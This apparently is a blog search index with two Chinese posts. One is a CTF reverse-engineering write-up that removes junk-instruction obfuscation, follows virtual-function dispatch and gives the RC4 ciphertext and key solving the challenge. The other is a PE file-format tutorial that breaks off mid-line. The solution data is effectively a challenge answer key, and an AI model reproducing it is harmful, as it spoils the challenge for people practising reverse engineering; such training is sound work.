<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>软件系统安全逆向分析-混淆对抗</title>
      <link href="/2025/01/17/%E8%BD%AF%E4%BB%B6%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8%E9%80%86%E5%90%91%E5%88%86%E6%9E%90-%E6%B7%B7%E6%B7%86%E5%AF%B9%E6%8A%97/"/>
      <url>/2025/01/17/%E8%BD%AF%E4%BB%B6%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8%E9%80%86%E5%90%91%E5%88%86%E6%9E%90-%E6%B7%B7%E6%B7%86%E5%AF%B9%E6%8A%97/</url>
      
        <content type="html"><![CDATA[<html><head></head><body><h1 id="1-概述"><a href="#1-概述" class="headerlink" title="1. 概述"></a>1. 概述</h1><p>在一般的软件中，我们逆向分析时候通常都不能直接看到软件的明文源代码，或多或少存在着混淆对抗的操作。下面，我会实践操作一个例子从无从下手到攻破目标。</p><ol><li>花指令对抗</li><li>虚函数表</li><li>RC4</li></ol><h1 id="2-实战-donntyousee"><a href="#2-实战-donntyousee" class="headerlink" title="2. 实战-donntyousee"></a>2. 实战-donntyousee</h1><blockquote><p>题目载体为具有漏洞的小型软件，部分题目提供源代码，要求攻击者发现并攻击软件中存在的漏洞。</p></blockquote><h2 id="2-1-程序测试"><a href="#2-1-程序测试" class="headerlink" title="2.1 程序测试"></a>2.1 程序测试</h2><p>首先拿到这道题目,查壳看架构,elf64</p><p><img src="/2025/01/17/%E8%BD%AF%E4%BB%B6%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8%E9%80%86%E5%90%91%E5%88%86%E6%9E%90-%E6%B7%B7%E6%B7%86%E5%AF%B9%E6%8A%97/1736141027067-32219b3a-6310-4a52-8c3c-9195084c0572.png" alt="111"></p><p>放到虚拟机中运行一下</p><p><img src="/2025/01/17/%E8%BD%AF%E4%BB%B6%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8%E9%80%86%E5%90%91%E5%88%86%E6%9E%90-%E6%B7%B7%E6%B7%86%E5%AF%B9%E6%8A%97/1736141071276-0a07ecd4-6ec2-4c35-b4f6-ae32eb125cf2.png" alt="gkgh"></p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">plz input your flag</span><br><span class="line"><span class="number">8888888888888</span></span><br><span class="line">wrong</span><br></pre></td></tr></tbody></table></figure><p>ida64反编译，发现软件进行了去符号处理，最直白就是没有main()函数。</p><p>但是ida自动帮我们定位到了系统入口函数start()。</p><p><img src="/2025/01/17/%E8%BD%AF%E4%BB%B6%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8%E9%80%86%E5%90%91%E5%88%86%E6%9E%90-%E6%B7%B7%E6%B7%86%E5%AF%B9%E6%8A%97/1736141135233-8718ea6b-3e4c-4191-94e9-2a36ad066bd3.png" alt="wadawd"></p><p>然后我们查字符串 plz、wrong，均无法查到相关字符串</p><p><img src="/2025/01/17/%E8%BD%AF%E4%BB%B6%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8%E9%80%86%E5%90%91%E5%88%86%E6%9E%90-%E6%B7%B7%E6%B7%86%E5%AF%B9%E6%8A%97/1736141237204-ff91506e-358b-4406-8776-d265a6e84a45.png" alt="aaaaaaaa"></p><p>可见程序对静态分析做了很大的操作，防止一眼顶真。</p><p>然后我们回到系统入口函数start，F5反编译。</p><p>程序无法完全反编译，并且发现init和fini均无法正常识别。</p><p><img src="/2025/01/17/%E8%BD%AF%E4%BB%B6%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8%E9%80%86%E5%90%91%E5%88%86%E6%9E%90-%E6%B7%B7%E6%B7%86%E5%AF%B9%E6%8A%97/1736141377809-a3fdbd0c-9c6e-4b31-9651-7a6f99d0f813.png" alt="ddddd"></p><p>进入main函数，即sub_405559()，无可用信息。</p><p><img src="/2025/01/17/%E8%BD%AF%E4%BB%B6%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8%E9%80%86%E5%90%91%E5%88%86%E6%9E%90-%E6%B7%B7%E6%B7%86%E5%AF%B9%E6%8A%97/1736141555760-56270549-64e7-4acc-8823-45c6364a2be9.png" alt="sadadasdasd"></p><h2 id="2-2-花指令对抗"><a href="#2-2-花指令对抗" class="headerlink" title="2.2 花指令对抗"></a>2.2 花指令对抗</h2><p>看汇编</p><p><img src="/2025/01/17/%E8%BD%AF%E4%BB%B6%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8%E9%80%86%E5%90%91%E5%88%86%E6%9E%90-%E6%B7%B7%E6%B7%86%E5%AF%B9%E6%8A%97/1736141622883-b0eff95e-d45a-405b-91e9-e4cef15b9338.png" alt="cccc"></p><p><img src="/2025/01/17/%E8%BD%AF%E4%BB%B6%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8%E9%80%86%E5%90%91%E5%88%86%E6%9E%90-%E6%B7%B7%E6%B7%86%E5%AF%B9%E6%8A%97/1736141626595-8717a314-6296-4247-9482-c8f93dedc4e3.png" alt="vv"></p><p>很明显，程序做的混淆对抗是加了花指令。</p><blockquote><p><font style="color:rgb(77, 77, 77);">花指令实质就是一串垃圾指令，它与程序本身的功能无关，并不影响程序本身的逻辑。在</font><font style="color:rgb(252, 85, 49);">软件</font><font style="color:rgb(77, 77, 77);">保护中，花指令被作为一种手段来增加静态分析的难度。</font></p></blockquote><p><font style="color:rgb(77, 77, 77);">花指令关键在于对堆栈变化以及函数调用的操作。</font><del><font style="color:rgb(77, 77, 77);">强硬的动态调试能力也可以无视花，直接en看。</font></del></p><p>对于此花指令，我们只需要将<code>call    $+5</code>、 <code>retn</code> nop 即可</p><p>（该软件的每个有用的function都加入了此花指令）</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">E8 <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>                call    $+<span class="number">5</span></span><br><span class="line">C3                            retn</span><br></pre></td></tr></tbody></table></figure><p><img src="/2025/01/17/%E8%BD%AF%E4%BB%B6%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8%E9%80%86%E5%90%91%E5%88%86%E6%9E%90-%E6%B7%B7%E6%B7%86%E5%AF%B9%E6%8A%97/1736144285769-5b00af92-f587-4775-9181-0c836ac6b6cb.png" alt="aaaaaaa"></p><p><img src="/2025/01/17/%E8%BD%AF%E4%BB%B6%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8%E9%80%86%E5%90%91%E5%88%86%E6%9E%90-%E6%B7%B7%E6%B7%86%E5%AF%B9%E6%8A%97/1736144355865-badc02e4-c892-4f9f-b6a4-456614bed7d9.png" alt="bbbb"></p><p>此时F5反编译,程序明显可读了</p><p><img src="/2025/01/17/%E8%BD%AF%E4%BB%B6%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8%E9%80%86%E5%90%91%E5%88%86%E6%9E%90-%E6%B7%B7%E6%B7%86%E5%AF%B9%E6%8A%97/1736144390491-7532b3df-da3e-4ee3-af2c-62d565bbc2eb.png" alt="cxz"></p><p><img src="/2025/01/17/%E8%BD%AF%E4%BB%B6%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8%E9%80%86%E5%90%91%E5%88%86%E6%9E%90-%E6%B7%B7%E6%B7%86%E5%AF%B9%E6%8A%97/1736144398275-337a5eb9-d655-483f-a6b1-6edf505fc352.png" alt="ggg"></p><h2 id="2-3-虚函数"><a href="#2-3-虚函数" class="headerlink" title="2.3 虚函数"></a>2.3 虚函数</h2><p>我们重命名一下，方便理解</p><p><img src="/2025/01/17/%E8%BD%AF%E4%BB%B6%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8%E9%80%86%E5%90%91%E5%88%86%E6%9E%90-%E6%B7%B7%E6%B7%86%E5%AF%B9%E6%8A%97/1736144541718-9c93f9c5-5fcc-4260-90a0-6ed7d676d46c.png" alt="zzz"></p><p>可见程序还使用了虚函数重定位的技术。</p><p>下面我们进行动态调试，具体跟进函数。</p><p><img src="/2025/01/17/%E8%BD%AF%E4%BB%B6%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8%E9%80%86%E5%90%91%E5%88%86%E6%9E%90-%E6%B7%B7%E6%B7%86%E5%AF%B9%E6%8A%97/1736145066000-31668d10-a596-4a5a-ad21-bec3ad26c5d1.png" alt="nnn"></p><p>F7进入</p><p><img src="/2025/01/17/%E8%BD%AF%E4%BB%B6%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8%E9%80%86%E5%90%91%E5%88%86%E6%9E%90-%E6%B7%B7%E6%B7%86%E5%AF%B9%E6%8A%97/1736145236712-6f701152-14e3-4524-a24a-215884ef293c.png" alt="xxzc"></p><p>又发现了花，我们nop掉</p><p><img src="/2025/01/17/%E8%BD%AF%E4%BB%B6%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8%E9%80%86%E5%90%91%E5%88%86%E6%9E%90-%E6%B7%B7%E6%B7%86%E5%AF%B9%E6%8A%97/1736145228597-c54e9be8-63ac-449f-b55e-780277326253.png" alt="xxxxx"></p><p><img src="/2025/01/17/%E8%BD%AF%E4%BB%B6%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8%E9%80%86%E5%90%91%E5%88%86%E6%9E%90-%E6%B7%B7%E6%B7%86%E5%AF%B9%E6%8A%97/1736145279149-c31fae08-c712-47d6-97c3-b265e5825709.png" alt="hhh"></p><p>然后进入下一个函数进行重复的操作</p><p><img src="/2025/01/17/%E8%BD%AF%E4%BB%B6%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8%E9%80%86%E5%90%91%E5%88%86%E6%9E%90-%E6%B7%B7%E6%B7%86%E5%AF%B9%E6%8A%97/1736145391726-b23e1cca-961b-408d-ae01-c44f3a2b8059.png" alt="cvcv"></p><p>再往下程序结束，但是我们并没有看到密文比较的地方。</p><p>我们对rc4的两个函数进行交叉引用，看哪里调用了他们呢</p><p><img src="/2025/01/17/%E8%BD%AF%E4%BB%B6%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8%E9%80%86%E5%90%91%E5%88%86%E6%9E%90-%E6%B7%B7%E6%B7%86%E5%AF%B9%E6%8A%97/1736145471860-67fe78ee-d054-45ce-85d6-14caa4ee2531.png" alt="yty"></p><p><img src="/2025/01/17/%E8%BD%AF%E4%BB%B6%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8%E9%80%86%E5%90%91%E5%88%86%E6%9E%90-%E6%B7%B7%E6%B7%86%E5%AF%B9%E6%8A%97/1736145577492-39477ef7-a8f3-45da-b55b-ed8304d19f6a.png" alt="yyy"></p><p><code>.data.rel.ro</code></p><p>这个节段是只读数据段的重定位段，在链接时重定位，里面放的就是我们的虚函数表。</p><p>看到下面还有一个sub_405CAA(),我们点击跟进。</p><p><img src="/2025/01/17/%E8%BD%AF%E4%BB%B6%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8%E9%80%86%E5%90%91%E5%88%86%E6%9E%90-%E6%B7%B7%E6%B7%86%E5%AF%B9%E6%8A%97/1736145780103-e0e93cfc-5af9-457d-b19e-448f91666c6a.png" alt="uuu"></p><p>至此，我们找到了程序的所有逻辑。</p><h2 id="2-4-RC4解密"><a href="#2-4-RC4解密" class="headerlink" title="2.4 RC4解密"></a>2.4 RC4解密</h2><p>提取密文</p><p><code>25CD54AF511C58D3A84B4F56EC835DD4F6474A6FE073B0A5A8C317815E2BF4F671EA2FFFA8639957</code> </p><p><img src="/2025/01/17/%E8%BD%AF%E4%BB%B6%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8%E9%80%86%E5%90%91%E5%88%86%E6%9E%90-%E6%B7%B7%E6%B7%86%E5%AF%B9%E6%8A%97/1736143368556-364c54cd-1b75-4fa5-b36a-be2884e8a053.png" alt="oo"></p><p>提取密钥</p><p><code>921C2B1FBAFBA2FF07697D77188C</code></p><p><img src="/2025/01/17/%E8%BD%AF%E4%BB%B6%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8%E9%80%86%E5%90%91%E5%88%86%E6%9E%90-%E6%B7%B7%E6%B7%86%E5%AF%B9%E6%8A%97/1736146044807-fbcbd97f-e261-49ba-8801-cc5d28a39bd3.png" alt="rr"></p><p>rc4_enc()函数还有个 <code>^23</code></p><p><img src="/2025/01/17/%E8%BD%AF%E4%BB%B6%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8%E9%80%86%E5%90%91%E5%88%86%E6%9E%90-%E6%B7%B7%E6%B7%86%E5%AF%B9%E6%8A%97/1736145886565-22a9cdaa-51c5-4a31-a5d9-fc589dc82c9f.png" alt="ll"></p><p>得解。</p></body></html>]]></content>
      
      
      <categories>
          
          <category> 二进制学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 逆向探究 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PE文件结构+实验</title>
      <link href="/2024/12/29/PE%E6%96%87%E4%BB%B6%E7%BB%93%E6%9E%84-%E5%AE%9E%E9%AA%8C/"/>
      <url>/2024/12/29/PE%E6%96%87%E4%BB%B6%E7%BB%93%E6%9E%84-%E5%AE%9E%E9%AA%8C/</url>
      
        <content type="html"><![CDATA[<html><head></head><body><h1 id="1-啥是PE？"><a href="#1-啥是PE？" class="headerlink" title="1. 啥是PE？"></a>1. 啥是PE？</h1><p>PE文件，即Portable Executable File Format，是Windows下可执行程序的一个统称，Windows下的所有可执行文件都是PE文件格式，比如.exe，.dll，.sys等。</p><p>PE文件是指 32 位可执行文件，也称为PE32。64位的可执行文件称为 <strong>PE+</strong> 或 <strong>PE32+<strong>，是PE(PE32)的一种扩展形式(请</strong>注意不是PE64</strong>)。</p><p>PE文件由PE头和PE体组成，而非只有头部。</p><p>PE结构不是一个单纯的结构，一个PE文件由若干个结构集合所构成，不同的结构有不同的用处。</p><p>PE文件格式是一种对文件组织管理的方式。</p><p><img src="/2024/12/29/PE%E6%96%87%E4%BB%B6%E7%BB%93%E6%9E%84-%E5%AE%9E%E9%AA%8C/0.png" alt="0"></p><p>来张图助助兴，如下图所示=。=</p><p><img src="/2024/12/29/PE%E6%96%87%E4%BB%B6%E7%BB%93%E6%9E%84-%E5%AE%9E%E9%AA%8C/2.png" alt="2"></p><h1 id="2-PE文件结构概述"><a href="#2-PE文件结构概述" class="headerlink" title="2.PE文件结构概述"></a>2.PE文件结构概述</h1><h2 id="2-1-PE文件结构"><a href="#2-1-PE文件结构" class="headerlink" title="2.1 PE文件结构"></a>2.1 PE文件结构</h2><p>一般分为4个部分：</p><ul><li><strong>DOS头</strong>：DOS头是PE文件结构的第一个头，用来保持对DOS系统的兼容，并且用于定位真正的PE头。我们关注的主要是两个属性：e_magic （MZ标识）和 e_lfanew（定位真正的PE头）。</li><li><strong>NT头</strong>：包括PE文件标识、PE文件头和可选头。包含 windows PE 文件的主要信息，其中包括一个 ‘PE’ 字样的签名，PE文件头(IMAGE_FILE_HEADER)和 PE可选头(IMAGE_OPTIONAL_HEADER32)。</li><li><strong>节表</strong>：是PE文件后续节的描述，windows根据节表的描述加载每个节。</li><li><strong>节</strong>：每个节实际上是一个容器，可以包含 代码、数据 等等，每个节可以有独立的内存权限，比如代码节默认有读/执行权限，节的名字和数量可以自己定义。</li></ul><h2 id="2-2-编写示例程序"><a href="#2-2-编写示例程序" class="headerlink" title="2.2 编写示例程序"></a>2.2 编写示例程序</h2><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">.386  //用到的汇编指令的指令集是.386</span><br><span class="line">.model flat, stdcall //flat表示使用的是内存的平坦模式，stdcall是函数调用的一种方式</span><br><span class="line">option casemap:none //casemap:none就是不区分大小写</span><br><span class="line"></span><br><span class="line">//调用头文件和链接库</span><br><span class="line">include windows.inc //一些常量</span><br><span class="line">include kernel32.inc //kernel32.dll中的一些系统函数</span><br><span class="line">include user32.inc //user32.dll的一些函数</span><br><span class="line">includelib kernel32.lib</span><br><span class="line">includelib user32.lib</span><br><span class="line"></span><br><span class="line">//定义字符串</span><br><span class="line">.data</span><br><span class="line">szCaption   db  <span class="string">'hello'</span>, 0 //db是字节的意思，定义hello字符串，汇编中win32用,<span class="string">'\0'</span>进行结尾</span><br><span class="line">szText    db <span class="string">'hello world!'</span>, 0</span><br><span class="line"></span><br><span class="line">//代码部分</span><br><span class="line">.code</span><br><span class="line">start: //代码从标号开始执行，下面的end start也就是说标号是start</span><br><span class="line">push 0</span><br><span class="line">lea eax, szCaption</span><br><span class="line">push eax</span><br><span class="line">lea eax, szText</span><br><span class="line">push eax</span><br><span class="line">push 0</span><br><span class="line">call MessageBox //一段简单的弹窗代码，弹出文本szCaption和szText</span><br><span class="line">push 0</span><br><span class="line">call ExitProcess</span><br><span class="line">end start</span><br></pre></td></tr></tbody></table></figure><p><img src="/2024/12/29/PE%E6%96%87%E4%BB%B6%E7%BB%93%E6%9E%84-%E5%AE%9E%E9%AA%8C/image-20241229182540062-1735467949238-1.png" alt="image-20241229182540062"></p><p>下面的一系列操作以及对PE文件结构的学习均以此程序为例。</p><h2 id="2-3-VA-虚拟地址-与-RVA-相对虚拟地址"><a href="#2-3-VA-虚拟地址-与-RVA-相对虚拟地址" class="headerlink" title="2.3 VA(虚拟地址)与 RVA(相对虚拟地址)"></a>2.3 VA(虚拟地址)与 RVA(相对虚拟地址)</h2><p>当一个PE文件被加载到内存中以后，我们称之为”映象 “(image)，一般来说，PE文件在硬盘上和在内存里是不完全一样的，被加载到内存以后其占用的虚拟地址空间要比在硬盘上占用的空间大一些，这是因为各个节在硬盘上是连续的，而在内存中是<strong>按页对齐</strong>的，所以加载到内存以后节之间会出现一些“空洞”。<br>因为存在这种对齐，所以在PE结构内部，表示某个位置的地址采用了两种方式：</p><ul><li>针对在硬盘上存储文件中的地址，称为原始存储地址或物理地址，表示<strong>距离文件头的偏移</strong>。</li><li>针对加载到内存以后映象中的地址，称为 相对虚拟地址(RVA)，表示<strong>相对内存映象头的偏移</strong>。</li></ul><p>然而CPU 的某些指令是需要使用<strong>绝对地址</strong>的，比如取全局变量的地址，传递函数的地址，以及编译后的汇编指令中肯定需要用到绝对地址而不是相对映象头的偏移，因此PE文件会建议操作系统将其加载到某个内存地址(这个叫<strong>基地址</strong>。段地址其实就是一种基地址，但基地址并不等于就是段地址)。编译器便根据这个地址求出代码中一些 全局变量和函数的地址，并将这些地址用到对应的指令中。<br>因此可以得出<code>VA = RVA + IMAGEBASE</code>。(<strong>虚拟地址VA = 相对虚拟地址RVA + 装载地址</strong>)</p><h1 id="3-DOS头"><a href="#3-DOS头" class="headerlink" title="3. DOS头"></a>3. DOS头</h1><h2 id="3-1-DOS头"><a href="#3-1-DOS头" class="headerlink" title="3.1 DOS头"></a>3.1 DOS头</h2><p>DOS头是PE文件结构的第一个头，用来保持对DOS系统的兼容，并且用于<strong>定位真正的PE头</strong>。</p><p>因为DOS操作系统已经不存在了，DOS头现在的作用也就是保持一个兼容给出一个提示，没什么太大作用。</p><p>DOS头在winnt.h头文件中的定义如下（该文件头大小为40h，64d）</p><blockquote><p>TIPS:WORD是双字节，LONG是4字节</p></blockquote><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_DOS_HEADER</span> {</span></span><br><span class="line">WORDe_magic; <span class="comment">//00h EXE标志MZ，MZ是一个人名的缩写</span></span><br><span class="line">WORDe_cblp; <span class="comment">//02h 最后（部分)页中的字节数</span></span><br><span class="line">WORDe_cp; <span class="comment">//04h 文件中的全部和部分页数</span></span><br><span class="line">WORDe_crlc; <span class="comment">//06h 重定位表中的指针数</span></span><br><span class="line">WORDe_cparhdr; <span class="comment">//08h 头部尺寸，以段落为单位</span></span><br><span class="line">WORDe_minalloc; <span class="comment">//0Ah 所需的最小附加段</span></span><br><span class="line">WORDe_maxalloc; <span class="comment">//0Ch 所需的最大附加段</span></span><br><span class="line">WORDe_ss; <span class="comment">//0Eh 初始的SS值(相对偏移量)</span></span><br><span class="line">WORDe_sp; <span class="comment">//10h 初始的SP值</span></span><br><span class="line">WORDe_csum; <span class="comment">//12h 校验和</span></span><br><span class="line">WORDe_ip; <span class="comment">//14h 初始的IP值</span></span><br><span class="line">WORDe_cs; <span class="comment">//16h 初始的CS值</span></span><br><span class="line">WORDe_lfarlc; <span class="comment">//18h 重定位表的字节偏移量</span></span><br><span class="line">WORDe_ovno; <span class="comment">//1Ah 覆盖号</span></span><br><span class="line">WORDe_res[<span class="number">4</span>]; <span class="comment">//1Ch 保留字</span></span><br><span class="line">WORDe_oemid; <span class="comment">//24h EM标识符（相对e_oeminfo )</span></span><br><span class="line">WORDe_oeminfo; <span class="comment">//26h OEM信息; e_oemid specific</span></span><br><span class="line">WORDe_res2[<span class="number">10</span>]; <span class="comment">//28h 保留字</span></span><br><span class="line">LONGe_lfanew; <span class="comment">//3Ch PE头相对于文件的偏移地址</span></span><br><span class="line">} IMAGE_DOS_HEADER, *PIMAGE_DOS_HEADER;</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_DOS_SIGNATURE 0x4D5A <span class="comment">//MZ</span></span></span><br></pre></td></tr></tbody></table></figure><p><strong>我们关注的主要是两个属性：e_magic 和 e_lfanew</strong></p><ul><li>e_magic用来标志这是一个PE文件</li><li>e_lfanew用来标志NT头的偏移。</li></ul><p><img src="/2024/12/29/PE%E6%96%87%E4%BB%B6%E7%BB%93%E6%9E%84-%E5%AE%9E%E9%AA%8C/image-20241229185221801.png" alt="image-20241229185221801"></p><p>一般来说DOS头的大小为0x40 byte，即64个字节</p><p>65开始为PE头</p><h2 id="3-2-DOS存根"><a href="#3-2-DOS存根" class="headerlink" title="3.2 DOS存根"></a>3.2 DOS存根</h2><p>那么，其他属性的作用是什么呢？</p><p>我们把00000000到000000B0之间的数据拷贝下来粘贴进一个新文件，保存为dos.bin</p><p><img src="/2024/12/29/PE%E6%96%87%E4%BB%B6%E7%BB%93%E6%9E%84-%E5%AE%9E%E9%AA%8C/1688456-20220710222135461-1768083568.png" alt="imgsaDAS"></p><p>这一块代码实际上是在编译-连接的时候自动添加进来的一个程序，被称为<strong>DOS存根</strong></p><p>读一下汇编，它的作用就是输出”This program cannot be run in DOS mode.”这个字符串，然后功能吗是4C01，即退出程序。</p><h2 id="3-3-小实验：只有e-magic和e-lfanew这两个属性有用"><a href="#3-3-小实验：只有e-magic和e-lfanew这两个属性有用" class="headerlink" title="3.3 小实验：只有e_magic和e_lfanew这两个属性有用"></a>3.3 小实验：只有e_magic和e_lfanew这两个属性有用</h2><p>为了证明DOS头只有前2个字节（MZ标识）和后4个字节（指向PE头地址）有用，即只有e_magic和e_lfanew这两个属性有用，其他属性都是没用的。我们测试一下。</p><p>我们把除了这两个属性之外的属性全部填充为00，再次尝试运行程序。</p><p><img src="/2024/12/29/PE%E6%96%87%E4%BB%B6%E7%BB%93%E6%9E%84-%E5%AE%9E%E9%AA%8C/image-20241229185851381.png" alt="image-20241229185851381"></p><p>程序成功运行</p><p><img src="/2024/12/29/PE%E6%96%87%E4%BB%B6%E7%BB%93%E6%9E%84-%E5%AE%9E%E9%AA%8C/image-20241229185956293.png" alt="image-20241229185956293"></p><h1 id="4-NT头"><a href="#4-NT头" class="headerlink" title="4. NT头"></a>4. NT头</h1><p>NT头结构体主要有3个属性</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">DWORD                   Signature;</span><br><span class="line">IMAGE_FILE_HEADER       FileHeader;</span><br><span class="line">IMAGE_OPTIONAL_HEADER64 OptionalHeader;</span><br></pre></td></tr></tbody></table></figure><ul><li>PE标识</li><li>文件头</li><li>可选头</li></ul><p>通过前面介绍的DOS头（IMAGE_DOS_HEADER）中的e_lfanew属性，我们可以找到真正的PE头（IMAGE_NT_HEADERS），IMAGE_NT_HEADERS的定义如下</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _WIN64</span></span><br><span class="line"><span class="keyword">typedef</span> IMAGE_NT_HEADERS64          IMAGE_NT_HEADERS;</span><br><span class="line"><span class="keyword">typedef</span> PIMAGE_NT_HEADERS64         PIMAGE_NT_HEADERS;</span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line"><span class="keyword">typedef</span> IMAGE_NT_HEADERS32          IMAGE_NT_HEADERS;</span><br><span class="line"><span class="keyword">typedef</span> PIMAGE_NT_HEADERS32         PIMAGE_NT_HEADERS;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></tbody></table></figure><p>我们发现这个HEADER加了个S，说明他不是单个头组成的，是由多个头组成的。</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_NT_HEADERS64</span> {</span>    <span class="comment">// 64位版本</span></span><br><span class="line">  DWORD                   Signature;</span><br><span class="line">  IMAGE_FILE_HEADER       FileHeader;</span><br><span class="line">  IMAGE_OPTIONAL_HEADER64 OptionalHeader;</span><br><span class="line">} IMAGE_NT_HEADERS64, *PIMAGE_NT_HEADERS64;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_NT_HEADERS</span> {</span>     <span class="comment">// 32位版本</span></span><br><span class="line">  DWORD                   Signature;</span><br><span class="line">  IMAGE_FILE_HEADER       FileHeader;</span><br><span class="line">  IMAGE_OPTIONAL_HEADER32 OptionalHeader;</span><br><span class="line">} IMAGE_NT_HEADERS32, *PIMAGE_NT_HEADERS32;</span><br></pre></td></tr></tbody></table></figure><p>我们重点介绍32位的（64位的只有属性宽度等不同）。 — <strong>见下面4.2部分</strong></p><h2 id="4-1-PE标识"><a href="#4-1-PE标识" class="headerlink" title="4.1 PE标识"></a>4.1 PE标识</h2><p>固定的<strong>PE</strong>，两个字节的字符.</p><h2 id="4-2-PE文件头"><a href="#4-2-PE文件头" class="headerlink" title="4.2 PE文件头"></a>4.2 PE文件头</h2><p>文件头结构体是用来<strong>判断程序是exe还是dll</strong>，定义如下：</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 该结构体可以用于判断文件是exe文件还是dll文件 </span></span><br><span class="line"><span class="comment">// 14h 20d</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_FILE_HEADER</span> {</span></span><br><span class="line">   WORD Machine; <span class="comment">// 0x04 运行平台</span></span><br><span class="line">   WORD NumberOfSections;  <span class="comment">// 0x06 PE中节的数量，最大96个节 </span></span><br><span class="line">   DWORD TimeDateStamp;  <span class="comment">// 0x08 文件创建日期和时间，编译器创建此文件时的时间戳 </span></span><br><span class="line">   DWORD PointerToSymbolTable; <span class="comment">// 0x0C 指向符号表（用于调试）</span></span><br><span class="line">   DWORD NumberOfSymbols;  <span class="comment">// 0x10 符号表中符号个数（用于调试）</span></span><br><span class="line">   WORD SizeOfOptionalHeader;  <span class="comment">// 0x14 可选头IMAGE_OPTIONAL_HEADER结构体的长度 32位是E0 64位是F0</span></span><br><span class="line">   WORD Characteristics; <span class="comment">// 0x16 文件的属性 exe是010f dll是210e</span></span><br><span class="line">}IMAGE_FILE_HEADER, *PIMAGE_FILE_HEADER;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_SIZEOF_FILE_HEADER 